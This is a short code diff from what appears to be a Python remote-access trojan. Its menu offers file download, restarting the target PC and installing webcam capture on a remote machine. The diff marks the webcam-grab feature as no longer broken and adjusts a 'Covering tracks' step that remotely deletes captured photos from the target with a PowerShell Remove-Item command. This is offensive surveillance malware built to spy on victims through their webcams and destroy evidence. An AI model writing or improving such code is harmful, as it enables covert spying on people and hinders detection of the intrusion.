@@ -45,7 +45,7 @@ options_menu = """
             [6] - Download File
             [7] - Restart Target PC
             [8] - Install WebCam Capture
-            [9] - Grab WebCam Pictures [BROKEN]
+            [9] - Grab WebCam Pictures
 
         [+] Options:
             [h] or [help] ----- Help Menu
@@ -212,7 +212,7 @@ def grab_webcam(address, password, working, username):
 
     # deletes photos off of target
     print("[*] Covering tracks...")
-    delete_screenshots = f"powershell Remove-Item {working}/bNOEXCxyVp/*"
+    delete_screenshots = f"powershell Remove-Item {working}/bNOEXCxyVp/*.bmp"
     remote_command(address, password, delete_screenshots)
     print("[+] Photos downloaded")
 
